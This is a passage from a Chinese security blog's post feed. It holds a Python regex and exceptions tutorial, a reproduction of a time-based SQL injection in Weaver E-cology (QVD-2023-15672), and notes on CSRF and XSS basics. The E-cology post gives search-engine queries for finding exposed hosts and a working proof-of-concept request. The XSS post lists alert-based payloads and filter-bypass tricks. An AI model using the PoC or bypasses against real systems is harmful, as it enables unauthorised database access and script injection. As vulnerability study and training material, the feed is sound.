class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    s = <span class="string">r&#x27;^010-\d&#123;8&#125;&#x27;</span></span><br><span class="line">    str1 = <span class="string">&quot;010-12349987dsadadw&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(re.findall(s,str1))</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>*是指0到多次<br>+是指1到多次</p><p>?是指要么0次要么1次</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">r&#x27;ab*&#x27;</span>    <span class="comment"># *是指0到多次</span></span><br><span class="line">s = <span class="string">r&#x27;ab+&#x27;</span>    <span class="comment"># +是指1到多次</span></span><br><span class="line">s = <span class="string">r&#x27;ab?&#x27;</span>    <span class="comment"># ?是指要么0次要么1次</span></span><br><span class="line">s = <span class="string">r&#x27;ab&#123;2,4&#125;&#x27;</span><span class="comment">#是指匹配b2次到4次</span></span><br><span class="line">str1 = <span class="string">&quot;a ab abb abbbb abb&quot;</span></span><br></pre></td></tr></table></figure><p>ab\d{1,2}    ab后面跟了1到2个随机数字</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">r&#x27;ab\d&#123;1,2&#125;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;a ab1 ab2 ab2345 ab234124&quot;</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>匹配邮箱（match）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">r&#x27;[a-zA-z0-9]&#123;4,20&#125;@(163|126|qq|sohu|gmail)\.com$&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;Hahanihao123@qq.com&quot;</span></span><br><span class="line"><span class="built_in">print</span>(re.<span class="keyword">match</span>(s,str1).group())</span><br></pre></td></tr></table></figure><p>findall查找字符串中匹配条件的内容(搜索整个字符串)</p><p>match 会更加精确的匹配（从开头开始搜，开头没有就没有）</p><p>search 搜索整个字符串，print(re.search(s,str1).group())显示第一次匹配到的东西</p><p>匹配<h1>haha</h1></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">r&#x27;&lt;\w*&gt;.*&lt;/\w*&gt;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;&lt;h1&gt;haha&lt;/h1&gt;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(re.findall(s,str1))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">r&#x27;&lt;(\w*)&gt;.*&lt;/\1&gt;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;&lt;h1&gt;haha&lt;/h1&gt;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(re.search(s,str1).group())</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">r&#x27;\d+&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;阅读数:9991&quot;</span></span><br><span class="line"><span class="built_in">print</span>(re.findall(s,str1))</span><br><span class="line"><span class="built_in">print</span>(re.search(s,str1).group())</span><br><span class="line"><span class="built_in">print</span>(re.<span class="keyword">match</span>(s,str1))</span><br><span class="line"></span><br><span class="line"><span class="comment">#替换</span></span><br><span class="line">s = <span class="string">r&#x27;\d+&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;阅读数:9991&quot;</span></span><br><span class="line"><span class="built_in">print</span>(re.sub(s,<span class="string">&quot;100&quot;</span>,str1))</span><br></pre></td></tr></table></figure><p>.*贪婪匹配</p><p>. 代表匹配任意字符一次</p><p>.*代表匹配任意字符</p><p>正则表达式的编译</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"><span class="comment">#正则表达式的编译</span></span><br><span class="line">    obj = re.<span class="built_in">compile</span>(<span class="string">&#x27;\d&#123;2&#125;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(obj.search(<span class="string">&quot;abcd12345&quot;</span>).group())</span><br><span class="line">    <span class="built_in">print</span>(obj.search(<span class="string">&quot;123123abcabc&quot;</span>).group())</span><br></pre></td></tr></table></figure><p>正则表达式+迭代器</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ret = re/finditer(<span class="string">&#x27;\d&#123;3&#125;&#x27;</span>,<span class="string">&#x27;abcd1234cde5678&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(ret)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(ret).group())</span><br><span class="line"><span class="built_in">print</span>([i.group() <span class="keyword">for</span> i <span class="keyword">in</span> ret])</span><br></pre></td></tr></table></figure><p>匹配网站截取内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">r&#x27;&lt;(\w+)&gt;.(&lt;/\1&gt;&#x27;</span></span><br><span class="line">ret = re.finditer(s,<span class="built_in">str</span>)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;网站截取内容&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(ret).group())</span><br></pre></td></tr></table></figure><p>匹配标签内的字</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">r&#x27;&lt;span class =&quot;.*?&quot;&gt;(.*?)&lt;/span&gt; &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(re.findall(s,<span class="built_in">str</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">news = <span class="string">&#x27;&lt;div&gt;&lt;a href = &quot;https://www.baidu.com&quot;&gt;去百度看&lt;/a&gt;&lt;a href =&quot;https://www.qq.com&quot;&gt;去腾讯看&lt;/a&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line">s = <span class="string">r&#x27;&lt;a.*?&gt;(.*?)&lt;/a&gt;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(re.findall(s,news))</span><br></pre></td></tr></table></figure><p>匹配a标签所夹内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">r&#x27;&lt;a.*?href=.*?&lt;\/a&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>匹配url</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">r&#x27;&lt;a.*?href=&quot;(.*?)&quot;.*?&gt;.*?&lt;/a&gt;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(re.findall(s,news))</span><br></pre></td></tr></table></figure><p>可百度搜索Match tracer 使用</p><h3 id="31-异常处理"><a href="#31-异常处理" class="headerlink" title="31.异常处理"></a>31.异常处理</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">try</span>:<span class="comment">#写入被检测代码块</span></span><br><span class="line">        a=<span class="number">0</span></span><br><span class="line">        b=<span class="number">0</span></span><br><span class="line">        c=a/b</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;代码出错了&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>打印异常原因</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    a = <span class="string">&quot;sad&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">int</span>(a)</span><br><span class="line">        <span class="comment">#预先估计异常原因</span></span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:<span class="comment">#精确到哪种异常</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;valueerror&#x27;</span>,e)</span><br><span class="line">    <span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;keyerror&#x27;</span>,e)</span><br><span class="line">    <span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;indexerror&#x27;</span>,e)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:<span class="comment">#未知异常</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未知异常&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>主动出发异常</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    a = <span class="string">&quot;sad&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;haha nihao&quot;</span>)</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;请充值&quot;</span>)<span class="comment">#创造异常</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;keep&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:<span class="comment">#精确到哪种异常</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;valueerror&#x27;</span>,e)</span><br><span class="line">    <span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;keyerror&#x27;</span>,e)</span><br><span class="line">    <span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;indexerror&#x27;</span>,e)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:<span class="comment">#未知异常</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未知异常&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:<span class="comment">#无论异常与否都执行finally</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;不管怎样，都执行finally&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>泛微E-cology sql延时注入漏洞(QVD-2023-15672)复现</title>
      <link href="/2023/07/12/%E6%B3%9B%E5%BE%AEE-cology%20sql%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(QVD-2023-15672)%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/07/12/%E6%B3%9B%E5%BE%AEE-cology%20sql%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(QVD-2023-15672)%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="泛微E-cology-sql延时注入漏洞-QVD-2023-15672-复现"><a href="#泛微E-cology-sql延时注入漏洞-QVD-2023-15672-复现" class="headerlink" title="泛微E-cology sql延时注入漏洞(QVD-2023-15672)复现"></a>泛微E-cology sql延时注入漏洞(QVD-2023-15672)复现</h1><p>参考文章:</p><p><a href="https://blog.csdn.net/qq_41904294/article/details/131666128?spm=1001.2014.3001.5502">泛微E-Cology SQL注入漏洞复现（QVD-2023-15672）</a></p><h2 id="1-产品简介"><a href="#1-产品简介" class="headerlink" title="1.产品简介"></a>1.产品简介</h2><p>泛微E-cology系统是中国泛微网络科技股份有限公司（以下简称“泛微科技”）开发的一种企业级协同办公平台。该系统以办公自动化和协同办公为核心，提供了一系列功能和工具，帮助企业实现信息管理、流程管控、团队协作和业务应用等多方面的需求。</p><p>泛微E-cology系统具有以下主要特点和功能：</p><ol><li>办公自动化：系统支持企业内部的各种办公流程自动化，包括审批流程、请假流程、报销流程等，提高工作效率和减少重复性工作。</li><li>协同办公：系统提供了团队协作、文档分享和讨论等功能，便于员工之间的信息共享和协调，增强团队合作和沟通效率。</li><li>企业信息管理：系统可以集中管理企业的人员信息、组织架构、项目信息等重要数据，方便企业对信息进行统一管理和查询。</li><li>业务应用扩展：系统支持自定义业务应用的开发和集成，可以根据企业的实际需求定制特定的应用模块，满足企业的个性化需求。</li><li>安全性和权限控制：系统具备严格的权限管理和安全机制，确保用户数据的安全性和访问控制。</li></ol><p>泛微E-cology系统适用于各类企业和组织，可以帮助企业优化流程、提高工作效率、加强团队协作，提升整体管理水平。同时，泛微科技也不断进行技术创新和产品优化，以满足不同企业的个性化需求。</p><h2 id="2-漏洞概述"><a href="#2-漏洞概述" class="headerlink" title="2.漏洞概述"></a>2.漏洞概述</h2><p>泛微E-cology的延时SQL注入漏洞可以被攻击者利用来获取未经授权的数据库访问权限，窃取敏感数据、修改数据或者执行其他恶意操作。攻击者可以通过构造特定的注入字符串，操纵应用程序的数据库查询，以达到攻击目的。</p><p>延时SQL注入漏洞的危害在于，它可能导致敏感数据泄露、系统崩溃、业务中断，甚至可能为攻击者提供全面的控制权限，从而危害企业的信息安全和业务运作。</p><h2 id="3-影响范围"><a href="#3-影响范围" class="headerlink" title="3.影响范围"></a>3.影响范围</h2><p>E-cology 9.x 补丁版本 &lt; 10.58.0</p><p>E-cology 8.x 补丁版本 &lt; 10.58.0</p><h2 id="4-复现过程"><a href="#4-复现过程" class="headerlink" title="4.复现过程"></a>4.复现过程</h2><p>1.资产检索</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">鹰图:web.icon=&quot;41eca7a9245394106a09b2534d8030df&quot;</span><br><span class="line">fofa:app=&quot;泛微-协同商务系统&quot;</span><br></pre></td></tr></table></figure><p>2.漏洞复现</p><p>访问搜索到的资产</p><p>尝试访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://[ip]/weaver/weaver.file.FileDownloadForOutDoc?fileid=1+WAITFOR+DELAY%270%3A0%3A8%27&amp;isFromOutImg=1</span><br></pre></td></tr></table></figure><p>发现sleep8秒后加载内容</p><p>加载8秒后成功加载:</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307121245154.png"></p><p>验证成功。</p><p>Poc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /weaver/weaver.file.FileDownloadForOutDoc?fileid=1+WAITFOR+DELAY%270%3A0%3A7%27&amp;isFromOutImg=1HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h2 id="5-修复方案"><a href="#5-修复方案" class="headerlink" title="5.修复方案"></a>5.修复方案</h2><p>临时解决方案:</p><p>限制访问来源地址，如非必要，不要将系统开放在互联网上。</p><p>升级修复方案:</p><p>官方已发布安全补丁,建议受影响用户尽快升级至10.58及以上版本</p><p><a href="https://www.weaver.com.cn/cs/securityDownload.asp#">https://www.weaver.com.cn/cs/securityDownload.asp#</a></p><h2 id="6-参考文章"><a href="#6-参考文章" class="headerlink" title="6.参考文章"></a>6.参考文章</h2><p><a href="https://blog.csdn.net/qq_41904294/article/details/131666128?spm=1001.2014.3001.5502">泛微E-Cology SQL注入漏洞复现（QVD-2023-15672）</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF基础</title>
      <link href="/2023/07/11/CSRF%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/07/11/CSRF%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="1-CSRF基础"><a href="#1-CSRF基础" class="headerlink" title="1.CSRF基础"></a>1.CSRF基础</h2><p>CSRF（Cross-Site Request Forgery），也称为跨站请求伪造，是一种常见的Web应用程序安全漏洞。它利用了Web应用程序对用户请求的信任，攻击者通过欺骗用户在受害者身份下执行恶意操作。</p><p>CSRF攻击的基本过程如下：</p><ol><li>用户登录：用户在一个网站A上进行登录，网站A会为其分配一个会话（session）。</li><li>恶意网站：用户后续浏览其他网站时，访问了一个恶意网站B。</li><li>伪造请求：恶意网站B会构造一个请求，该请求会针对用户在网站A上的身份进行操作，例如修改密码、转账等。</li><li>伪装请求：恶意网站B使用各种技术手段，如隐藏表单、图片标签或者通过Ajax请求等，将这个伪造的请求发送给网站A。</li><li>用户误操作：由于用户已经登录了网站A并信任该网站，浏览器会在不知情的情况下发送伪造请求，并执行恶意操作。</li></ol><p>CSRF攻击的危害取决于受到攻击的网站的业务逻辑和用户权限。该漏洞可能导致用户账户被盗、敏感信息泄露、非授权操作等。为了防范CSRF攻击，开发者可以采取一些措施，如使用CSRF令牌、验证Referer头、双重因素身份验证等。</p><p>漏洞危害</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">具体功能决定危害程度</span><br><span class="line">修改性别 / 个人信息等</span><br><span class="line">修改管理员密码</span><br><span class="line">添加管理员</span><br><span class="line">后台getshell</span><br></pre></td></tr></table></figure><h2 id="2-CSRF防御"><a href="#2-CSRF防御" class="headerlink" title="2.CSRF防御"></a>2.CSRF防御</h2><p>1.验证HTTP Referer字段<br>2.添加Token字段并验证<br>3.添加自定义字段并验证</p><h2 id="3-CSRF漏洞检测"><a href="#3-CSRF漏洞检测" class="headerlink" title="3.CSRF漏洞检测"></a>3.CSRF漏洞检测</h2><p>漏洞检测:<br>a.敏感功能缺乏csrf防护机制</p><ol><li>在burpsuite中观察post请求是否带有随机Token 和 验证码</li><li>再判断 去掉&#x2F;修改 Referer后是否仍然可以提交成功</li></ol><p>b.网站可以允许写入csrf payload</p><ol><li>测试用户头像<code>&lt;img&gt;</code> &#x2F; 富文本区域的<code>&lt;img&gt;</code> <code>&lt;svg&gt;</code>标签(可控)</li><li>插入payload</li></ol><p>挖掘思路:</p><p>1.是否存在token和验证码,是否可以删除或伪造<br>2.是否可以删除或伪造referer<br>3.&lt;img&gt;&#x2F;&lt;svg&gt;等标签链接是否可控</p><p>常见漏洞点<br>1.修改密码 2.修改个人信息 3.发布文章 4.与账号相关的大部分业务功能点</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS基础</title>
      <link href="/2023/07/09/XSS%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/07/09/XSS%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS基础"><a href="#XSS基础" class="headerlink" title="XSS基础"></a>XSS基础</h1><p>XSS（跨站脚本攻击）是一种常见的Web应用程序安全漏洞，攻击者通过注入恶意脚本代码来利用该漏洞。下面是XSS漏洞的渲染过程：<br>    1.用户输入：攻击者通常通过网站上的输入字段（如表单、URL参数等）提供恶意脚本代码。<br>    2.服务器渲染：用户输入的数据在服务器端被接收，并在动态内容被生成和渲染页面之前进行处理。<br>    3.脚本注入：如果服务器端没有对用户输入进行适当的过滤和验证，恶意脚本代码将被注入到最终生成的HTML页面中。<br>    4.浏览器解析：用户访问该页面时，浏览器会解析HTML，并执行其中的JavaScript代码。<br>    5.恶意执行：恶意脚本代码执行，可能导致活动篡改、窃取个人敏感信息、会话劫持等危害。</p><h2 id="1-XSS种类："><a href="#1-XSS种类：" class="headerlink" title="1.XSS种类："></a><strong>1.XSS种类：</strong></h2><p>反射（主动触发</p><p>dom（主动触发</p><p>存储型（被动触发</p><h3 id="1-1-反射型"><a href="#1-1-反射型" class="headerlink" title="1.1.反射型"></a>1.<strong>1.反射型</strong></h3><p><strong>GET型</strong></p><p>创造一触发xss的页面后让其他用户点击</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">?message = <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">?meseage = <span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>POST型</strong></p><p>在post date里输入攻击代码</p><hr><h3 id="1-2-存储型"><a href="#1-2-存储型" class="headerlink" title="1.2.存储型"></a><strong>1.2.存储型</strong></h3><p>一般会把代码放在数据库中，危害很大</p><p>每个点击的用户都会被动触发</p><p>多留言板、弹幕、论坛</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">h<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>aha</span><br></pre></td></tr></table></figure><hr><h3 id="1-3-DOM型"><a href="#1-3-DOM型" class="headerlink" title="1.3.DOM型"></a>1.<strong>3.DOM型</strong></h3><p>dom型</p><p>和js有互动</p><p><strong>DOM-xss-1</strong></p><p>用js和前端进行互动</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;&#x27;</span>&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>法一</p><p>闭合写新标签</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">herf</span> = <span class="string">&#x27;#&#x27;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> = <span class="string">&#x27;#&#x27;</span> <span class="attr">onmouseover</span> = <span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span> &#x27;&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">&#x27;#&#x27;</span> <span class="attr">onclick</span> = <span class="string">&quot;alert(&#x27;1&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>法二</p><p>javascript协议</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;javascript:alert(1)&#x27;</span>&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>DOM-xss-x</strong></p><p>输入一个参数会被页面上的某些js函数进行处理，处理后再显示到页面</p><p>这种情况需要对js处理函数进行分析,构造payload</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">if</span>=<span class="string">&quot;xssd_main&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        function domxss()&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            var str = window.location.search;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            var txss = decodeURIComponent(str.split(&quot;text=&quot;)[1]);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            var xss = txss.replace(/\+/g,&#x27;&#x27;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            alert(xss);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            document.getElementById(&quot;dom&quot;).innerHTML = &quot;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;&quot;+xss+&quot;&#x27;</span>&gt;</span>就让往事随风吧，都随风吧<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&quot;;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">#&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onmouseover</span> = <span class="string">&quot;alert(1)&quot;</span></span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="language-handlebars">&lt;<span class="attr">a</span> <span class="attr">href</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onclick</span>=<span class="string">&#x27;domxss()&#x27;</span>&gt;</span>有些费尽心机想要忘记的事情,后来真的就忘掉了<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><h2 id="2-XSSpayload构造"><a href="#2-XSSpayload构造" class="headerlink" title="2.XSSpayload构造"></a>2.XSSpayload构造</h2><h3 id="2-1常用标签"><a href="#2-1常用标签" class="headerlink" title="2.1常用标签"></a>2.1常用标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;123&lt;/a&gt;</span><br><span class="line">&lt;body onload=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;div onclick=&quot;alert(1)&quot;&gt;h&lt;/div&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(1)&quot;&gt;&lt;/svg&gt;</span><br><span class="line">&lt;object onclick=&quot;alert(1)&quot;&gt;123&lt;/object&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onfocus=&quot;alert(1)&quot; autofocus&gt;</span><br><span class="line">&lt;iframe src=&quot;javascript:alert(1);&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;button onclick=&quot;alert(1)&quot;&gt;click!&lt;/button&gt;</span><br><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="2-2常用on事件"><a href="#2-2常用on事件" class="headerlink" title="2.2常用on事件"></a>2.2常用on事件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">onclick=点击触发</span><br><span class="line">onload=加载触发</span><br><span class="line">onerror=报错触发</span><br><span class="line">onfocus=获得焦点触发</span><br><span class="line">onblur=失去焦点触发</span><br><span class="line">onmouseover=鼠标悬停</span><br><span class="line">onkeydown= onkeypress= onkeyup=  键盘操作触发</span><br><span class="line">onchange=内容改变触发</span><br><span class="line">onscroll=滚动条滚动触发</span><br></pre></td></tr></table></figure><h3 id="2-3常用测试函数"><a href="#2-3常用测试函数" class="headerlink" title="2.3常用测试函数"></a>2.3常用测试函数</h3><p>src挖掘</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">console.log()</span><br></pre></td></tr></table></figure><p>弹窗</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert()</span><br><span class="line">confirm()</span><br><span class="line">prompt()</span><br></pre></td></tr></table></figure><h2 id="4-常用绕过方式"><a href="#4-常用绕过方式" class="headerlink" title="4.常用绕过方式"></a>4.常用绕过方式</h2><p>1.大小写绕过</p><p>外部标签无视大小写，内部的js代码是大小写敏感的</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">scRiPT</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2.双写绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/sc&lt;/script&gt;ript&gt;</span><br></pre></td></tr></table></figure><p>3.注释绕过</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    --&gt;</span></span><br><span class="line">&lt;scr<span class="comment">&lt;!-- abc --&gt;</span>ipt&gt;alert<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>4.过滤圆括号(),用反引号&#96;&#96;替代</p><p>5.使用svg实体字符编码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>6.换行逃逸js匹配</p><p>7.单标签不写右标签</p><p>8.输入内容全大写- 远程js</p><p>9.使用长英语绕过</p><p>10.编码绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;&gt;() 尝试单词或多次url编码</span><br><span class="line">&quot;[内容]&quot; 双引号的内容尝试unicode编码</span><br><span class="line">&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;&lt;/object&gt; base64编码</span><br></pre></td></tr></table></figure><p>11.payload长度受限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.短域名</span><br><span class="line">2.&lt;svg/onload=alert(1)</span><br></pre></td></tr></table></figure><p>12.空格绕过<br>用+或&#x2F;**&#x2F;</p><h2 id="5-XSS危害与防御"><a href="#5-XSS危害与防御" class="headerlink" 